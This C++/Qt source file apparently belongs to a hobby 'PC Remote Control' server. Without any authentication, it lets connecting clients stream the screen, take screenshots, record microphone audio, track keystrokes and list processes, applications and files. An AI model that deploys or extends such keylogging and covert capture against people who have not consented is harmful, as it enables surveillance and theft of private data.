
#include "server.h"

#include <QDebug>
#include <QApplication>
#include <QScreen>
#include "windows.h"


#define NETCARD_ROOT    L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkCards"
#define TCPIP_ROOT  L"SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\\Interfaces"


Server::Server(QObject *parent)
    : QObject{parent}
{
    initServer();
//    myFileExplorer = new fileExplorer;
    connect(tcpServer, &QTcpServer::newConnection, this, &Server::newConnection);

    clients = QList<QTcpSocket*>();
}

//Server::~Server() {
//    delete processKeyboardTrack;
//    delete processListProcesses;
//}

void Server::initServer()
{
    tcpServer = new QTcpServer(this);
    if (!tcpServer->listen()) {
//        QMessageBox::critical(this, tr("Fortune Server"),
//                              tr("Unable to start the server: %1.")
//                                  .arg(tcpServer->errorString()));
        qDebug() << "Unable to start server.";
        return;
    }

    QList<QHostAddress> ipAddressesList2 = QNetworkInterface::allAddresses();
    for (const QHostAddress& address : ipAddressesList2) {
        if (address != QHostAddress::LocalHost && address.protocol() == QAbstractSocket::IPv4Protocol) {
            qDebug() << "Local LAN IP Address:" << address.toString();
        }
    }
    QList<QNetworkInterface> interfaces = QNetworkInterface::allInterfaces();

    HKEY hNetCardsKey;
    LSTATUS lStatus = ERROR_SUCCESS;

    lStatus = RegOpenKey(HKEY_LOCAL_MACHINE,
                         NETCARD_ROOT,
                         &hNetCardsKey);

    if(ERROR_SUCCESS == lStatus)
    {
        DWORD dwCards = 0L;
        DWORD dwMaxSubkeyNameLen = 0L;
        lStatus = RegQueryInfoKey(hNetCardsKey, NULL, NULL, NULL, &dwCards,
                                  &dwMaxSubkeyNameLen, NULL, NULL, NULL, NULL, NULL, NULL);

        if(ERROR_SUCCESS == lStatus && dwCards)
        {
            for(DWORD i = 0; i < dwCards; i++)
            {
                TCHAR wszCurrentCardIdxName[MAX_PATH];
                wszCurrentCardIdxName[0] = '\0';
                lStatus = RegEnumKey(hNetCardsKey, i,
                                     wszCurrentCardIdxName, MAX_PATH);

                if(ERROR_SUCCESS == lStatus)
                {
                    TCHAR wszAdapterKeyName[MAX_PATH];
                    wszAdapterKeyName[0] = '\0';

                    wsprintf(wszAdapterKeyName, L"%s\\%s", NETCARD_ROOT,
                             wszCurrentCardIdxName);

                    HKEY hCardNameKey;

                    lStatus = RegOpenKey(
                        HKEY_LOCAL_MACHINE,
                        wszAdapterKeyName,
                        &hCardNameKey);

                    if(ERROR_SUCCESS == lStatus)
                    {
                        TCHAR wszServiceNameGuid[MAX_PATH];
                        TCHAR wszAdapterName[MAX_PATH];

                        DWORD dwSize = sizeof(wszServiceNameGuid);
                        wszServiceNameGuid[0] = '\0';
                        RegQueryValueEx(
                            hCardNameKey,
                            L"ServiceName",
                            NULL,
                            NULL,
                            (LPBYTE)wszServiceNameGuid,
                            &dwSize);

                        dwSize = sizeof(wszAdapterName);
                        RegQueryValueEx(
                            hCardNameKey,
                            L"Description",
                            NULL,
                            NULL,
                            (LPBYTE)wszAdapterName,
                            &dwSize);

                        OutputDebugStringW(wszServiceNameGuid);
                        OutputDebugStringW(L"\n");

                        RegCloseKey(hCardNameKey);

                        //Get parameters
                        TCHAR wszCardParamKey[MAX_PATH];
                        wszCardParamKey[0] = '\0';
                        wsprintf(wszCardParamKey,L"%s\\%s", TCPIP_ROOT, wszServiceNameGuid);

                        HKEY hParamKey = NULL;

                        lStatus = RegOpenKey(
                            HKEY_LOCAL_MACHINE,
                            wszCardParamKey,
                            &hParamKey);

                        if(ERROR_SUCCESS == lStatus)
                        {
                            DWORD dwEnabledDHCP = 0L;
                            DWORD dwDWSize = sizeof(DWORD);
                            TCHAR wszStaticIP[32];
                            TCHAR wszDHCPIP[32];
                            DWORD dwIPSize = sizeof(wszDHCPIP);

                            ZeroMemory(wszDHCPIP, dwIPSize);
                            ZeroMemory(wszStaticIP, dwIPSize);

                            lStatus = RegQueryValueEx(
                                hParamKey,
                                L"EnableDHCP",
                                NULL, NULL,
                                (LPBYTE)&dwEnabledDHCP,
                                &dwDWSize);

                            if(SUCCEEDED(lStatus))
                            {
                               qDebug() << "Adapter : " << wszServiceNameGuid << " [" << wszAdapterName <<
                                    "] \n\tDHCP : " << (dwEnabledDHCP  ? "Yes" : "No") <<"\n";

                            }

                            lStatus = RegQueryValueEx(
                                hParamKey,
                                L"IPAddress",
                                NULL,
                                NULL,
                                (LPBYTE)&wszStaticIP,
                                &dwIPSize);

                            if(SUCCEEDED(lStatus))
                            {
                               qDebug() << "\tConfigured IP Address : " << wszStaticIP << "\n";
                            }


                           qDebug() << ("\n");

                            RegCloseKey(hParamKey);
                        }

                    }
                }
            }
        }


        RegCloseKey(hNetCardsKey);
    }


    // if we did not find one, use IPv4 localhost
    if (ipAddress.isEmpty())
        ipAddress = QHostAddress(QHostAddress::LocalHost).toString();

    //! [1]
    port = QString::number(tcpServer->serverPort());
}

void Server::sendMessage(QTcpSocket* sender, const QString &msg, QString type)
{
    QByteArray block;
    QDataStream out(&block, QIODevice::WriteOnly);
    out.setVersion(QDataStream::Qt_6_5);

    out << type << msg;
    sender->write(block);
}

void Server::sendScreenshot(QTcpSocket* sender, const QPixmap &screenshot, QString type) {
//    QPixmap resizedScreenshot = screenshot.scaled(800, 800, Qt::KeepAspectRatio, Qt::SmoothTransformation);

    QByteArray block;
    QDataStream out(&block, QIODevice::WriteOnly);
    out.setVersion(QDataStream::Qt_6_5);

    QByteArray byteArray;
    QBuffer buffer(&byteArray);
    buffer.open(QIODevice::WriteOnly);
    screenshot.save(&buffer, "JPEG");
    out << type << byteArray;
    sender->write(block);
    qDebug() << "image sent to client";
}

void Server::sendFileStructure(QTcpSocket* sender, const QStringList &fileStruct)
{
    QByteArray block;
    QDataStream out(&block, QIODevice::WriteOnly);
    out.setVersion(QDataStream::Qt_6_5);

    out << tr("file") << fileStruct;
    sender->write(block);
}

void Server::sendApplications(QTcpSocket* sender, const QStringList &appList)
{
    QByteArray block;
    QDataStream out(&block, QIODevice::WriteOnly);
    out.setVersion(QDataStream::Qt_6_5);

    out << tr("list applications") << appList;
    sender->write(block);
}
void Server::send_audio_file(QTcpSocket* sender){
    QFile file("D:\\recorded_data.m4a");
    file.open(QIODevice::ReadOnly);
    QByteArray mydata = file.readAll();

    QDataStream out(&mydata, QIODevice::WriteOnly);
    out.setVersion(QDataStream::Qt_6_5);

    out << tr("audio") << mydata;
    sender->write(mydata);
    qDebug() << "audio sent";
    file.close();
}
void Server::readMessage() {
    QTcpSocket *clientConnection = static_cast<QTcpSocket*>(sender());
    if (clientConnection != nullptr) {
        qDebug() << "read message client connection not null";
    }


    in.setDevice(clientConnection);
    in.setVersion(QDataStream::Qt_6_5);
    in.startTransaction();

    QString message;
    in >> message;

    qDebug() << "A message just got to server: " << message;

    if (!in.commitTransaction())
        return;

//    statusLabel->setText(message);

    if (message == tr("list applications")) {
//        sendMessage(clientConnection, "here are the applications: ");
        QStringList paths = QStandardPaths::standardLocations(QStandardPaths::ApplicationsLocation);
//        QStringList paths;
//        paths << "%programdata%\\Microsoft\\Windows\\Start Menu\\Programs";
        QStringList applications;
        for (const QString &path : paths)
        {
//            QDir dir(path);
            QDirIterator it(path, {"*.exe","*.lnk"}, QDir::Files, QDirIterator::Subdirectories);
            while (it.hasNext()) {
                qDebug() << it.next();
                applications.append(it.next());
            }
        }
        sendApplications(clientConnection, applications);

        qDebug() << applications;

    }
    else if (message == tr("list processes")) {
//        sendMessage(clientConnection, "here are the processes: ");
        processListProcesses = new QProcess();
        processListProcesses->start("D:\\_Codes\\Qt_Creator_Projects\\PC_Remote_Control\\list_processes.exe");
//        connect(processListProcesses, &QProcess::readyReadStandardOutput, this, &Server::processDataProcess);
        connect(processListProcesses, &QProcess::readyReadStandardOutput, this, [=]() {
            sendProcesses(clientConnection);
        });
        //        startHook();
    }
    else if (message == tr("keyboard_track")) {
        qDebug() << "keyboard tracking started?";
        processKeyboardTrack = new QProcess();
        processKeyboardTrack->start(".\\keyboard_track.exe");
        connect(processKeyboardTrack, &QProcess::readyReadStandardOutput, this, [=]() {
//            QProcess *process = static_cast<QProcess*>(sender());
//            qDebug() << "is this on?";
        QString data(processKeyboardTrack->readAllStandardOutput());
        QString temp(data);
        qDebug() << temp << "||" << temp.indexOf(tr("\r\n"));
        QStringList pieces = temp.split( tr("\r\n"), Qt::SkipEmptyParts );
        QString m_name = pieces.value( 0 );
        QString m_combine = pieces.value( 1 );
        qDebug() << m_name << "||" << m_combine;

        QByteArray block;
        QDataStream out(&block, QIODevice::WriteOnly);
        out.setVersion(QDataStream::Qt_6_5);

        out << tr("stroke") << m_name << m_combine;
        clientConnection->write(block);

        });
    }
    else if(message == tr("stop_stroke")){
        processKeyboardTrack->kill();
        delete processKeyboardTrack;
        processKeyboardTrack = nullptr;
    }
    else if (message == tr("take screenshot")) {
        qDebug() << "taken screenshot";
        QPixmap screenshot = QGuiApplication::primaryScreen()->grabWindow(0);
        sendScreenshot(clientConnection, screenshot, tr("image"));

    }
    else if (message == tr("stream screen")){
        qDebug() << "streaming screen";
        timer = new QTimer;
        connect(timer, &QTimer::timeout, this, [=]() {
            stream(clientConnection);
        });
        timer->start(200);
//        QTimer::singleShot(3000, timer, &QTimer::stop);
    }
    else if (message == tr("stop_stream")){
        timer->stop();
        delete timer;
        timer = nullptr;
        //        QTimer::singleShot(3000, timer, &QTimer::stop);
    }
    else if (message == tr("show directories")) {
        qDebug() << "show directories";
        QFileSystemModel model;
        model.setRootPath("C:\\");
//        sendFileStructure(model);
    }
    else if (message == tr("recording")){
        if (recorder == nullptr)
            recorder = new AudioRecorder;

        recorder->auto_start();
    }
    else if (message == tr("stop_recording")){
        recorder->stop_by_msg();

        recorder->close();
        delete recorder;
        recorder = nullptr;

        send_audio_file(clientConnection);
    }
    else if (message == "ls") {
        //        QString dirPath = args.size() > 1 ? args[1] : ".";
        QString dirPath = ".";
        QDir dir(dirPath);
        QStringList entries = dir.entryList();
        QString response = entries.join("\n");
        sendFileStructure(clientConnection, entries);
        qDebug() << entries << "\n";
        //        clientSocket->flush();
    }

    emit(readyRead(message));
}

void Server::stream(QTcpSocket* clientConnection) {
    QPixmap screenshot = QGuiApplication::primaryScreen()->grabWindow(0);
    sendScreenshot(clientConnection, screenshot, tr("stream"));
}

void Server::sendProcesses(QTcpSocket* clientSocket) {
    QProcess *process = static_cast<QProcess *>(sender());
    qDebug() << "listing processing?";
    QString output = process->readAllStandardOutput();
    QStringList lines = output.split('\n');

//    foreach (QString line, lines) {
//        QList<QString>info  = line.split(' ', Qt::SkipEmptyParts);
//        if (info.size() > 1)
//            qDebug() << info[0] << info[1];
////        qDebug() << line;
//    }
    QByteArray block;
    QDataStream out(&block, QIODevice::WriteOnly);
    out.setVersion(QDataStream::Qt_6_5);

    out << tr("list processes") << lines;
    clientSocket->write(block);
}

void Server::newConnection() {
    QTcpSocket *clientConnection = tcpServer->nextPendingConnection();
    connect(clientConnection, &QTcpSocket::readyRead, this, &Server::readMessage);
    connect(clientConnection, &QTcpSocket::disconnected, this, &Server::disconnected);
    clients.append(clientConnection);
    qDebug() << "incoming connection.";
    //sendMessage(clientConnection, "ayooo", );
}

void Server::disconnected() {
    QTcpSocket *clientSocket = static_cast<QTcpSocket*>(sender());
    clients.removeOne(clientSocket);
}



